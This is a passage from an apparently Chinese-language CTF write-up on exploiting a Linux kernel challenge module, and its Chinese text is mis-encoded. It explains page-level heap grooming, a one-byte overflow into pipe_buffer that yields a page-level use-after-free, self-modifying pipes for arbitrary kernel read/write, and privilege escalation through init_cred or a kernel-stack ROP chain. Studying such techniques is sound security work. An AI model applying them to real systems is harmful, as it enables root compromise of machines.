out_free_pgvec;<br>&#125;<br><br>out:<br><span class="hljs-keyword">return</span> pg_vec;<br><br>out_free_pgvec:<br>free_pg_vec(pg_vec, order, block_nr);<br>pg_vec = <span class="hljs-literal">NULL</span>;<br><span class="hljs-keyword">goto</span> out;<br>&#125;<br></code></pre></td></tr></table></figure><p>åœ¨ <code>alloc_one_pg_vec_page()</code> ä¸­ä¼šç›´æ¥è°ƒç”¨ <code>__get_free_pages()</code> å‘ buddy system è¯·æ±‚å†…å­˜é¡µï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¯¥å‡½æ•°è¿›è¡Œå¤§é‡çš„é¡µé¢è¯·æ±‚ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">char</span> *<span class="hljs-title function_">alloc_one_pg_vec_page</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> order)</span><br>&#123;<br><span class="hljs-type">char</span> *buffer;<br><span class="hljs-type">gfp_t</span> gfp_flags = GFP_KERNEL | __GFP_COMP |<br>  __GFP_ZERO | __GFP_NOWARN | __GFP_NORETRY;<br><br>buffer = (<span class="hljs-type">char</span> *) __get_free_pages(gfp_flags, order);<br><span class="hljs-keyword">if</span> (buffer)<br><span class="hljs-keyword">return</span> buffer;<br><span class="hljs-comment">//...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>ç›¸åº”åœ°ï¼Œ <code>pgv</code> ä¸­çš„é¡µé¢ä¹Ÿä¼šåœ¨ socket è¢«å…³é—­åé‡Šæ”¾ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">packet_release()<br>    packet_set_ring()<br>    free_pg_vec()<br></code></pre></td></tr></table></figure><p> <code>setsockopt()</code>  ä¹Ÿå¯ä»¥å¸®åŠ©æˆ‘ä»¬å®Œæˆ<strong>é¡µçº§å †é£æ°´</strong>ï¼Œå½“æˆ‘ä»¬è€—å°½ buddy system ä¸­çš„ low order pages åï¼Œæˆ‘ä»¬å†è¯·æ±‚çš„é¡µé¢ä¾¿éƒ½æ˜¯ç‰©ç†è¿ç»­çš„ï¼Œå› æ­¤æ­¤æ—¶æˆ‘ä»¬å†è¿›è¡Œ  <code>setsockopt()</code>  ä¾¿<strong>ç›¸å½“äºè·å–åˆ°äº†ä¸€å—è¿‘ä¹ç‰©ç†è¿ç»­çš„å†…å­˜</strong>ï¼ˆä¸ºä»€ä¹ˆæ˜¯â€è¿‘ä¹è¿ç»­â€œæ˜¯å› ä¸ºå¤§é‡çš„ <code>setsockopt()</code> æµç¨‹ä¸­åŒæ ·ä¼šåˆ†é…å¤§é‡æˆ‘ä»¬ä¸éœ€è¦çš„ç»“æ„ä½“ï¼Œä»è€Œæ¶ˆè€— buddy system çš„éƒ¨åˆ†é¡µé¢ï¼‰</p><p>ç”±æ­¤ï¼Œæˆ‘ä»¬å¯ä»¥è·å¾—<strong>å¯¹ä¸€å—è¿ç»­å†…å­˜çš„é¡µçº§æŒæ§</strong>ï¼Œä»è€Œå¯ä»¥è¿™æ ·æ„é€ å‡ºå¦‚ä¸‹å›¾æ‰€ç¤ºå †å¸ƒå±€ï¼š</p><ul><li>å…ˆé‡Šæ”¾ä¸€éƒ¨åˆ†é¡µé¢ï¼Œè®© victim object å–å¾—è¿™äº›é¡µé¢</li><li>é‡Šæ”¾ä¸€ä»½é¡µé¢ï¼Œå‘é¢˜ç›®æ¨¡å—è¯·æ±‚åˆ†é…å¯¹è±¡ï¼Œä»è€Œè·å¾—è¯¥ä»½é¡µé¢</li><li>å†é‡Šæ”¾ä¸€éƒ¨åˆ†é¡µé¢ï¼Œè®© victim object å–å¾—è¿™äº›é¡µé¢</li></ul><p>è¿™æ ·é¢˜ç›®æ‰€åœ¨çš„é¡µé¢ä¾¿ä¼šè¢«å¤¹åœ¨ victim å¯¹è±¡çš„é¡µé¢ä¸­é—´ï¼Œä½¿å¾—<strong>æº¢å‡ºçš„ç¨³å®šæ€§å¤§å¹…å¢åŠ </strong></p><p><img src="https://s2.loli.net/2023/05/02/VvPk5nKYmDCWxOs.png" alt="image.png"></p><h2 id="Step-II-fcntl-F-SETPIPE-SZ-æ›´æ”¹-pipe-buffer-æ‰€åœ¨-slub-å¤§å°ï¼Œè·¨é¡µæº¢å‡ºæ„é€ é¡µçº§-UAF"><a href="#Step-II-fcntl-F-SETPIPE-SZ-æ›´æ”¹-pipe-buffer-æ‰€åœ¨-slub-å¤§å°ï¼Œè·¨é¡µæº¢å‡ºæ„é€ é¡µçº§-UAF" class="headerlink" title="Step.II - fcntl(F_SETPIPE_SZ) æ›´æ”¹ pipe_buffer æ‰€åœ¨ slub å¤§å°ï¼Œè·¨é¡µæº¢å‡ºæ„é€ é¡µçº§ UAF"></a>Step.II - fcntl(F_SETPIPE_SZ) æ›´æ”¹ pipe_buffer æ‰€åœ¨ slub å¤§å°ï¼Œè·¨é¡µæº¢å‡ºæ„é€ é¡µçº§ UAF</h2><p>æ¥ä¸‹æ¥æˆ‘ä»¬è€ƒè™‘æº¢å‡ºçš„ç›®æ ‡å¯¹è±¡ï¼Œç›¸ä¿¡å¤§å®¶æœ€å…ˆæƒ³åˆ°çš„åº”è¯¥æ˜¯ä¸‡èƒ½ç»“æ„ä½“ <code>msg_msg</code> ï¼Œä½†æ˜¯åœ¨ç¬”è€…çœ‹æ¥è¿™ä¸ªç»“æ„ä½“ <em>ä»æ—§ä¸å¤Ÿå¼ºå¤§</em> ï¼Œè€Œä¸”åœ¨è¿‡å»çš„å„ç§æ¼æ´åˆ©ç”¨å½“ä¸­æˆ‘ä»¬æœªå…ä¹Ÿå¤ªä¾èµ–äº <code>msg_msg</code> äº†ï¼Œæ‰€ä»¥ç¬”è€…æƒ³è¦æ¢ç´¢ä¸€äº›æ–°çš„æ–¹æ³•ï¼šï¼‰</p><p><img src="https://s2.loli.net/2023/05/01/sJB9zbLgSCYV8KE.png" alt="çŒªçŒªä¾ ï¼Œä½ å¤ªä¾èµ–è¶…çº§æ£’æ£’ç³–äº†.png"></p><p>ç”±äºä»…æœ‰ä¸€ä¸ªå­—èŠ‚çš„æº¢å‡ºï¼Œæ¯«æ— ç–‘é—®çš„æ˜¯æˆ‘ä»¬éœ€è¦å¯»æ‰¾ä¸€äº›åœ¨ç»“æ„ä½“å¤´éƒ¨ä¾¿æœ‰æŒ‡å‘å…¶ä»–å†…æ ¸å¯¹è±¡çš„æŒ‡é’ˆçš„å†…æ ¸å¯¹è±¡ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯ <code>pipe_buffer</code> æ˜¯ä¸€ä¸ªéå¸¸å¥½çš„çš„åˆ©ç”¨å¯¹è±¡ï¼Œå…¶å¼€å¤´æœ‰ç€æŒ‡å‘ <code>page</code> ç»“æ„ä½“çš„æŒ‡é’ˆï¼Œè€Œ <code>page</code> çš„å¤§å°ä»…ä¸º <code>0x40</code> ï¼Œå¯ä»¥è¢« 0x100 æ•´é™¤ï¼Œè‹¥æˆ‘ä»¬èƒ½å¤Ÿ<strong>é€šè¿‡ partial overwrite ä½¿å¾—ä¸¤ä¸ªç®¡é“æŒ‡å‘åŒä¸€å¼ é¡µé¢ï¼Œå¹¶é‡Šæ”¾æ‰å…¶ä¸­ä¸€ä¸ª</strong>ï¼Œæˆ‘ä»¬ä¾¿æ„é€ å‡ºäº†<strong>é¡µçº§çš„ UAF</strong>ï¼š</p><p><img src="https://s2.loli.net/2023/05/02/JLZOKejgoPdTkYA.png" alt="original state"></p><p><img src="https://s2.loli.net/2023/05/02/MwTSWUbeaY9Puro.png" alt="null-byte partial overwrite"></p><p><img src="https://s2.loli.net/2023/05/02/R3reNIAT1lG7sfw.png" alt="page-level UAF"></p><p>åŒæ—¶<strong>ç®¡é“çš„ç‰¹æ€§è¿˜èƒ½è®©æˆ‘ä»¬åœ¨ UAF é¡µé¢ä¸Šä»»æ„è¯»å†™</strong>ï¼Œè¿™çœŸæ˜¯å†ç¾å¦™ä¸è¿‡äº†ï¼šï¼‰</p><p>ä½†æ˜¯æœ‰ä¸€ä¸ªå°é—®é¢˜ï¼Œ<code>pipe_buffer</code> æ¥è‡ªäº <code>kmalloc-cg-1k</code> ï¼Œå…¶ä¼šè¯·æ±‚ order-2 çš„é¡µé¢ï¼Œè€Œé¢˜ç›®æ¨¡å—çš„å¯¹è±¡å¤§å°ä¸º 2kï¼Œå…¶ä¼šè¯·æ±‚ order-3 çš„é¡µé¢ï¼Œå¦‚æœæˆ‘ä»¬ç›´æ¥è¿›è¡Œä¸åŒ order é—´çš„å †é£æ°´çš„è¯ï¼Œåˆ™åˆ©ç”¨æˆåŠŸç‡ä¼šå¤§æ‰“æŠ˜æ‰£ :ï¼ˆ</p><p>ä½† pipe å¯ä»¥è¢«æŒ–æ˜çš„æ½œåŠ›è¿œæ¯”æˆ‘ä»¬æƒ³è±¡ä¸­å¤§å¾—å¤šï¼šï¼‰ç°åœ¨è®©æˆ‘ä»¬é‡æ–°å®¡è§† <code>pipe_buffer</code> çš„åˆ†é…è¿‡ç¨‹ï¼Œå…¶å®é™…ä¸Šæ˜¯å•æ¬¡åˆ†é… <code>pipe_bufs</code> ä¸ª <code>pipe_buffer</code> ç»“æ„ä½“ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">struct</span> pipe_inode_info *<span class="hljs-title function_">alloc_pipe_info</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>pipe-&gt;bufs = kcalloc(pipe_bufs, <span class="hljs-keyword">sizeof</span>(<span class="hljs-keyword">struct</span> pipe_buffer),<br>     GFP_KERNEL_ACCOUNT);<br></code></pre></td></tr></table></figure><p>è¿™é‡Œæ³¨æ„åˆ° <code>pipe_buffer</code> <strong>ä¸æ˜¯ä¸€ä¸ªå¸¸é‡è€Œæ˜¯ä¸€ä¸ªå˜é‡</strong>ï¼Œé‚£ä¹ˆ<strong>æˆ‘ä»¬èƒ½å¦æœ‰æ–¹æ³•ä¿®æ”¹ pipe_buffer çš„æ•°é‡ï¼Ÿ</strong>ç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œpipe ç³»ç»Ÿè°ƒç”¨éå¸¸è´´å¿ƒåœ°ä¸ºæˆ‘ä»¬æä¾›äº† <code>F_SETPIPE_SZ</code> <strong>è®©æˆ‘ä»¬å¯ä»¥é‡æ–°åˆ†é… pipe_buffer å¹¶æŒ‡å®šå…¶æ•°é‡</strong>ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">long</span> <span class="hljs-title function_">pipe_fcntl</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> file *file, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> cmd, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_inode_info</span> *<span class="hljs-title">pipe</span>;</span><br><span class="hljs-type">long</span> ret;<br><br>pipe = get_pipe_info(file, <span class="hljs-literal">false</span>);<br><span class="hljs-keyword">if</span> (!pipe)<br><span class="hljs-keyword">return</span> -EBADF;<br><br>__pipe_lock(pipe);<br><br><span class="hljs-keyword">switch</span> (cmd) &#123;<br><span class="hljs-keyword">case</span> F_SETPIPE_SZ:<br>ret = pipe_set_size(pipe, arg);<br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">static</span> <span class="hljs-type">long</span> <span class="hljs-title function_">pipe_set_size</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> arg)</span><br>&#123;<br><span class="hljs-comment">//...</span><br><br>ret = pipe_resize_ring(pipe, nr_slots);<br><br><span class="hljs-comment">//...</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">pipe_resize_ring</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> pipe_inode_info *pipe, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> nr_slots)</span><br>&#123;<br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">bufs</span>;</span><br><span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> head, tail, mask, n;<br><br>bufs = kcalloc(nr_slots, <span class="hljs-keyword">sizeof</span>(*bufs),<br>       GFP_KERNEL_ACCOUNT | __GFP_NOWARN);<br></code></pre></td></tr></table></figure><p>é‚£ä¹ˆæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯<strong>æˆ‘ä»¬å¯ä»¥é€šè¿‡ fcntl() é‡æ–°åˆ†é…å•ä¸ª pipe çš„ pipe_buffer æ•°é‡ï¼Œ</strong>ï¼š</p><ul><li>å¯¹äºæ¯ä¸ª pipe æˆ‘ä»¬<strong>æŒ‡å®šåˆ†é… 64 ä¸ª pipe_bufferï¼Œä»è€Œä½¿å…¶å‘ kmalloc-cg-2k è¯·æ±‚å¯¹è±¡ï¼Œè€Œè¿™å°†æœ€ç»ˆå‘ buddy system è¯·æ±‚ order-3 çš„é¡µé¢</strong></li></ul><p>ç”±æ­¤ï¼Œæˆ‘ä»¬ä¾¿æˆåŠŸä½¿å¾— <code>pipe_buffer</code> ä¸é¢˜ç›®æ¨¡å—çš„å¯¹è±¡<strong>å¤„åœ¨åŒä¸€ order çš„å†…å­˜é¡µä¸Š</strong>ï¼Œä»è€Œæé«˜ cross-cache overflow çš„æˆåŠŸç‡</p><p>ä¸è¿‡éœ€è¦æ³¨æ„çš„æ˜¯ï¼Œç”±äº page ç»“æ„ä½“çš„å¤§å°ä¸º 0x40ï¼Œå…¶å¯ä»¥è¢« 0x100 æ•´é™¤ï¼Œå› æ­¤è‹¥æˆ‘ä»¬æ‰€æº¢å‡ºçš„ç›®æ ‡ page çš„åœ°å€æœ€åä¸€ä¸ªå­—èŠ‚åˆšå¥½ä¸º <code>\x00</code>ï¼Œ  <em>é‚£å°±ç­‰æ•ˆäºæ²¡æœ‰æº¢å‡º</em>  ï¼Œå› æ­¤å®é™…ä¸Šåˆ©ç”¨æˆåŠŸç‡ä»…ä¸º <code>75% </code> ï¼ˆæ‚²ï¼‰</p><h2 id="Step-III-æ„é€ äºŒçº§è‡ªå†™ç®¡é“ï¼Œå®ç°ä»»æ„å†…å­˜è¯»å†™"><a href="#Step-III-æ„é€ äºŒçº§è‡ªå†™ç®¡é“ï¼Œå®ç°ä»»æ„å†…å­˜è¯»å†™" class="headerlink" title="Step.III - æ„é€ äºŒçº§è‡ªå†™ç®¡é“ï¼Œå®ç°ä»»æ„å†…å­˜è¯»å†™"></a>Step.III - æ„é€ äºŒçº§è‡ªå†™ç®¡é“ï¼Œå®ç°ä»»æ„å†…å­˜è¯»å†™</h2><p>æœ‰äº† page-level UAFï¼Œæˆ‘ä»¬æ¥ä¸‹æ¥è€ƒè™‘å‘è¿™å¼ é¡µé¢åˆ†é…ä»€ä¹ˆç»“æ„ä½“ä½œä¸ºä¸‹ä¸€é˜¶æ®µçš„ victim object</p><p>ç”±äºç®¡é“æœ¬èº«ä¾¿æä¾›ç»™æˆ‘ä»¬è¯»å†™çš„åŠŸèƒ½ï¼Œè€Œæˆ‘ä»¬åˆèƒ½å¤Ÿè°ƒæ•´ <code>pipe_buffer</code> çš„å¤§å°å¹¶é‡æ–°åˆ†é…ç»“æ„ä½“ï¼Œé‚£ä¹ˆå†æ¬¡é€‰æ‹© <code>pipe_buffer</code> ä½œä¸º victim object ä¾¿æ˜¯å†è‡ªç„¶ä¸è¿‡çš„äº‹æƒ…ï¼šï¼‰</p><p><img src="https://s2.loli.net/2023/05/02/lfmP8ZxicbjBNSR.png" alt="image.png"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬å¯ä»¥é€šè¿‡ UAF ç®¡é“<strong>è¯»å– pipe_buffer å†…å®¹ï¼Œä»è€Œæ³„éœ²å‡º pageã€pipe_buf_operations ç­‰æœ‰ç”¨çš„æ•°æ®</strong>ï¼ˆå¯ä»¥åœ¨é‡åˆ†é…å‰é¢„å…ˆå‘ç®¡é“ä¸­å†™å…¥ä¸€å®šé•¿åº¦çš„å†…å®¹ï¼Œä»è€Œå®ç°æ•°æ®è¯»å–ï¼‰ï¼Œç”±äºæˆ‘ä»¬å¯ä»¥é€šè¿‡ UAF ç®¡é“ç›´æ¥æ”¹å†™ <code>pipe_buffer</code> ï¼Œå› æ­¤å°†æ¼æ´è½¬åŒ–ä¸º dirty pipe æˆ–è®¸ä¼šæ˜¯ä¸€ä¸ªä¸é”™çš„åŠæ³•ï¼ˆè¿™ä¹Ÿæ˜¯æœ¬æ¬¡æ¯”èµ›ä¸­ NU1L æˆ˜é˜Ÿçš„è§£æ³•ï¼‰</p><p>ä½†æ˜¯ pipe çš„å¼ºå¤§ä¹‹å¤„è¿œä¸æ­¢è¿™äº›ï¼Œç”±äºæˆ‘ä»¬å¯ä»¥å¯¹ UAF é¡µé¢ä¸Šçš„ <code>pipe_buffer</code> è¿›è¡Œè¯»å†™ï¼Œæˆ‘ä»¬å¯ä»¥<strong>ç»§ç»­æ„é€ å‡ºç¬¬äºŒçº§çš„ page-level UAF</strong>ï¼š</p><p><img src="https://s2.loli.net/2023/05/02/yhNuT7kBj58K6gt.png" alt="secondary page-level UAF"></p><p>ä¸ºä»€ä¹ˆè¦è¿™ä¹ˆåšå‘¢ï¼Ÿåœ¨ç¬¬ä¸€æ¬¡ UAF æ—¶æˆ‘ä»¬è·å–åˆ°äº† page ç»“æ„ä½“çš„åœ°å€ï¼Œè€Œ page ç»“æ„ä½“çš„å¤§å°å›ºå®šä¸º 0x40ï¼Œ<strong>ä¸”ä¸ç‰©ç†å†…å­˜é¡µä¸€ä¸€å¯¹åº”</strong>ï¼Œè¯•æƒ³è‹¥æ˜¯æˆ‘ä»¬å¯ä»¥ä¸æ–­åœ°ä¿®æ”¹ä¸€ä¸ª pipe çš„ page æŒ‡é’ˆï¼Œ<strong>åˆ™æˆ‘ä»¬ä¾¿èƒ½å®Œæˆå¯¹æ•´ä¸ªå†…å­˜ç©ºé—´çš„ä»»æ„è¯»å†™</strong>ï¼Œå› æ­¤æ¥ä¸‹æ¥æˆ‘ä»¬è¦å®Œæˆè¿™æ ·çš„ä¸€ä¸ªåˆ©ç”¨ç³»ç»Ÿçš„æ„é€ </p><p>å†æ¬¡é‡æ–°åˆ†é… <code>pipe_buffer</code> ç»“æ„ä½“åˆ°ç¬¬äºŒçº§ page-level UAF é¡µé¢ä¸Šï¼Œ<strong>ç”±äºè¿™å¼ ç‰©ç†é¡µé¢å¯¹åº”çš„ page ç»“æ„ä½“çš„åœ°å€å¯¹æˆ‘ä»¬è€Œè¨€æ˜¯å·²çŸ¥çš„ï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥è®©è¿™å¼ é¡µé¢ä¸Šçš„ pipe_buffer çš„ page æŒ‡é’ˆæŒ‡å‘è‡ªèº«ï¼Œä»è€Œç›´æ¥å®Œæˆå¯¹è‡ªèº«çš„ä¿®æ”¹</strong>ï¼š</p><p><img src="https://s2.loli.net/2023/05/02/TYr8WlEushem2i3.png" alt="third-level self-pointing pipe"></p><p>è¿™é‡Œæˆ‘ä»¬å¯ä»¥ç¯¡æ”¹ <code>pipe_buffer.offset</code> ä¸ <code>pipe_buffer.len</code> æ¥ç§»åŠ¨ pipe çš„è¯»å†™èµ·å§‹ä½ç½®ï¼Œä»è€Œå®ç°æ— é™å¾ªç¯çš„è¯»å†™ï¼Œä½†æ˜¯è¿™ä¸¤ä¸ªå˜é‡ä¼šåœ¨å®Œæˆè¯»å†™æ“ä½œåé‡æ–°è¢«èµ‹å€¼ï¼Œå› æ­¤è¿™é‡Œæˆ‘ä»¬ä½¿ç”¨<strong>ä¸‰ä¸ªç®¡é“</strong>ï¼š</p><ul><li>ç¬¬ä¸€ä¸ªç®¡é“ç”¨ä»¥è¿›è¡Œå†…å­˜ç©ºé—´ä¸­çš„ä»»æ„è¯»å†™ï¼Œæˆ‘ä»¬é€šè¿‡ä¿®æ”¹å…¶ page æŒ‡é’ˆå®Œæˆ ï¼šï¼‰</li><li>ç¬¬äºŒä¸ªç®¡é“ç”¨ä»¥ä¿®æ”¹ç¬¬ä¸‰ä¸ªç®¡é“ï¼Œä½¿å…¶å†™å…¥çš„èµ·å§‹ä½ç½®æŒ‡å‘ç¬¬ä¸€ä¸ªç®¡é“</li><li>ç¬¬ä¸‰ä¸ªç®¡é“ç”¨ä»¥ä¿®æ”¹ç¬¬ä¸€ä¸ªä¸ç¬¬äºŒä¸ªç®¡é“ï¼Œä½¿å¾—ç¬¬ä¸€ä¸ªç®¡é“çš„ pipe æŒ‡é’ˆæŒ‡å‘æŒ‡å®šä½ç½®ã€ç¬¬äºŒä¸ªç®¡é“çš„å†™å…¥èµ·å§‹ä½ç½®æŒ‡å‘ç¬¬ä¸‰ä¸ªç®¡é“</li></ul><p>é€šè¿‡è¿™ä¸‰ä¸ªç®¡é“ä¹‹é—´äº’ç›¸å¾ªç¯ä¿®æ”¹ï¼Œæˆ‘ä»¬ä¾¿<strong>å®ç°äº†ä¸€ä¸ªå¯ä»¥åœ¨å†…å­˜ç©ºé—´ä¸­è¿›è¡Œè¿‘ä¹æ— é™åˆ¶çš„ä»»æ„è¯»å†™ç³»ç»Ÿ</strong> ï¼šï¼‰</p><h2 id="Step-IV-ææƒ"><a href="#Step-IV-ææƒ" class="headerlink" title="Step.IV - ææƒ"></a>Step.IV - ææƒ</h2><p>æœ‰äº†å†…å­˜ç©ºé—´ä¸­çš„ä»»æ„è¯»å†™ï¼Œææƒä¾¿æ˜¯éå¸¸ç®€ä¾¿çš„ä¸€ä»¶äº‹æƒ…äº†ï¼Œè¿™é‡Œç¬”è€…ç»™å‡ºä¸‰ç§ææƒæ–¹æ³•ï¼šï¼‰</p><h3 id="æ–¹æ³•ä¸€ã€ä¿®æ”¹å½“å‰è¿›ç¨‹çš„-task-struct-çš„-cred-ä¸º-init-cred"><a href="#æ–¹æ³•ä¸€ã€ä¿®æ”¹å½“å‰è¿›ç¨‹çš„-task-struct-çš„-cred-ä¸º-init-cred" class="headerlink" title="æ–¹æ³•ä¸€ã€ä¿®æ”¹å½“å‰è¿›ç¨‹çš„ task_struct çš„ cred ä¸º init_cred"></a>æ–¹æ³•ä¸€ã€ä¿®æ”¹å½“å‰è¿›ç¨‹çš„ task_struct çš„ cred ä¸º init_cred</h3><p><code>init_cred</code> ä¸ºæœ‰ç€ root æƒé™çš„ credï¼Œæˆ‘ä»¬å¯ä»¥ç›´æ¥å°†å½“å‰è¿›ç¨‹çš„ cred ä¿®æ”¹ä¸ºè¯¥ cred ä»¥å®Œæˆææƒï¼Œè¿™é‡Œiwomå¯ä»¥é€šè¿‡ <code>prctl(PR_SET_NAME, &quot;arttnba3pwnn&quot;);</code> ä¿®æ”¹ <code>task_struct.comm</code> ï¼Œä»è€Œæ–¹ä¾¿æœç´¢å½“å‰è¿›ç¨‹çš„ <code>task_struct</code> åœ¨å†…å­˜ç©ºé—´ä¸­çš„ä½ç½®ï¼šï¼‰</p><p>ä¸è¿‡ <code>init_cred</code> çš„ç¬¦å·æœ‰çš„æ—¶å€™æ˜¯ä¸åœ¨ <code>/proc/kallsyms</code> ä¸­å¯¼å‡ºçš„ï¼Œæˆ‘ä»¬åœ¨è°ƒè¯•æ—¶æœªå¿…èƒ½å¤Ÿè·å¾—å…¶åœ°å€ï¼Œå› æ­¤è¿™é‡Œç¬”è€…é€‰æ‹©é€šè¿‡è§£æ <code>task_struct</code> çš„æ–¹å¼å‘ä¸Šä¸€ç›´æ‰¾åˆ° <code>init</code> è¿›ç¨‹ï¼ˆæ‰€æœ‰è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ï¼‰çš„ <code>task_struct</code> ï¼Œä»è€Œè·å¾— <code>init_cred</code> çš„åœ°å€ï¼š</p><p><img src="https://s2.loli.net/2023/05/02/jO5GwFnmSxkr3fg.png" alt="image.png"></p><h3 id="æ–¹æ³•äºŒã€å†…æ ¸é¡µè¡¨è§£æè·å–å†…æ ¸æ ˆç‰©ç†åœ°å€ï¼Œåˆ©ç”¨ç›´æ¥æ˜ å°„åŒºè¦†å†™å†…æ ¸æ ˆå®Œæˆ-ROP"><a href="#æ–¹æ³•äºŒã€å†…æ ¸é¡µè¡¨è§£æè·å–å†…æ ¸æ ˆç‰©ç†åœ°å€ï¼Œåˆ©ç”¨ç›´æ¥æ˜ å°„åŒºè¦†å†™å†…æ ¸æ ˆå®Œæˆ-ROP" class="headerlink" title="æ–¹æ³•äºŒã€å†…æ ¸é¡µè¡¨è§£æè·å–å†…æ ¸æ ˆç‰©ç†åœ°å€ï¼Œåˆ©ç”¨ç›´æ¥æ˜ å°„åŒºè¦†å†™å†…æ ¸æ ˆå®Œæˆ ROP"></a>æ–¹æ³•äºŒã€å†…æ ¸é¡µè¡¨è§£æè·å–å†…æ ¸æ ˆç‰©ç†åœ°å€ï¼Œåˆ©ç”¨ç›´æ¥æ˜ å°„åŒºè¦†å†™å†…æ ¸æ ˆå®Œæˆ ROP</h3><p><strong>å¼€å¯äº† CFI å¹¶ä¸ä»£è¡¨æˆ‘ä»¬ä¾¿ä¸èƒ½å¤Ÿåœ¨å†…æ ¸ç©ºé—´ä¸­è¿›è¡Œä»»æ„ä»£ç æ‰§è¡Œäº†ï¼Œä½œä¸ºä¸€åé»‘å®¢æ²¡æœ‰ä»€ä¹ˆæ˜¯ä¸å¯èƒ½çš„ï¼Œæ‰€å› æ­¤æˆ‘ä»¬ä»ç„¶è¦è¿›è¡Œä»»æ„ä»£ç æ‰§è¡Œï¼šï¼‰</strong>ï¼ˆâ†æœ‰ç‚¹ä¸­äºŒçš„ä¸€ä¸ªäºº</p><p>ç”±äº page ç»“æ„ä½“æ•°ç»„ä¸ç‰©ç†å†…å­˜é¡µä¸€ä¸€å¯¹åº”çš„ç¼˜æ•…ï¼Œæˆ‘ä»¬å¯ä»¥å¾ˆè½»æ˜“åœ°åœ¨ç‰©ç†åœ°å€ä¸ page ç»“æ„ä½“åœ°å€é—´è¿›è¡Œè½¬æ¢ï¼Œè€Œåœ¨é¡µè¡¨å½“ä¸­å­˜æ”¾çš„æ˜¯ç‰©ç†åœ°å€ï¼Œæˆ‘ä»¬ä¸éš¾æƒ³åˆ°çš„æ˜¯<strong>æˆ‘ä»¬å¯ä»¥é€šè¿‡è§£æå½“å‰è¿›ç¨‹çš„é¡µè¡¨æ¥è·å–åˆ°å†…æ ¸æ ˆçš„ç‰©ç†åœ°å€ï¼Œä»è€Œè·å–åˆ°å†…æ ¸æ ˆå¯¹åº”çš„ page</strong>ï¼Œä¹‹åæˆ‘ä»¬å¯ä»¥<strong>ç›´æ¥å‘å†…æ ¸æ ˆä¸Šå†™ ROP chain æ¥å®Œæˆä»»æ„ä»£ç æ‰§è¡Œ</strong></p><p>é¡µè¡¨çš„åœ°å€å¯ä»¥é€šè¿‡ <code>mm_struct</code> è·å–ï¼Œ <code>mm_struct</code> åœ°å€å¯ä»¥é€šè¿‡ <code>task_struct</code> è·å–ï¼Œå†…æ ¸æ ˆåœ°å€åŒæ ·å¯ä»¥é€šè¿‡ <code>task_struct</code> è·å–ï¼Œé‚£ä¹ˆè¿™ä¸€åˆ‡å…¶å®æ˜¯æ°´åˆ°æ¸ æˆçš„äº‹æƒ…ï¼š</p><p><img src="https://s2.loli.net/2023/05/02/sRVcEax3wHApBW2.png" alt="image.png"></p><blockquote><p>ä½†è¿™ç§æ–¹æ³•æœ‰ä¸€ä¸ªç¼ºé™·ï¼Œæˆ‘ä»¬ä¼š<strong>æœ‰ä¸€å®šæ¦‚ç‡æ²¡æ³•ç›´æ¥å†™åˆ°å½“å‰è¿›ç¨‹çš„å†…æ ¸æ ˆä¸Š</strong>ï¼ˆä¹Ÿä¸çŸ¥é“å†™å“ªå»äº†ï¼‰ï¼Œä»è€Œå¯¼è‡´ ROP å¤±è´¥ï¼Œ<strong>åŸå› ä¸æ˜</strong></p><blockquote><p>ç¬”è€…æš‚æ—¶æ²¡æœ‰å‘ç°æ•´ä¸ªè¿‡ç¨‹çš„åŸç†å­˜åœ¨ç¼ºé™·çš„åœ°æ–¹ï¼Œç”šè‡³å°è¯•å¤šæ¬¡é‡æ–°è§£æé¡µè¡¨ï¼ˆå¾—åˆ°çš„å†…æ 